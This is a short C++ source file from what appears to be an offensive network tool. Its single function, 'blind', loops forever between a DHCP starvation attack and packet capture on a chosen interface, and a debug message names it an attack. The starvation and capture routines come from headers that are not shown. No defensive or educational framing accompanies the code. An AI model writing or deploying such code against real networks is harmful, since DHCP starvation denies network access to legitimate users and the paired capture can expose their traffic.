#include <capture.h>
#include <packet.h>
#include <socket.hpp>
#include <blind.h>
#include <exceptions.hpp>
#include <stdio.h>
#include <DHCP.h>
#include <thread>
#include <chrono>
#include <iostream>
#include <string>

void blind(char * interface,int delay){
    #ifdef DEBUG

    printf("[dbg] Starting the blind attack @");

    #endif 

    do{
        DHCP:
            DHCPStarvation(interface);
            std::this_thread::sleep_for(std::chrono::seconds(delay));
            goto PCAP;
        PCAP:
            capture(interface);
            std::this_thread::sleep_for(std::chrono::seconds(delay));
            goto DHCP;
    }while ( 1 );
}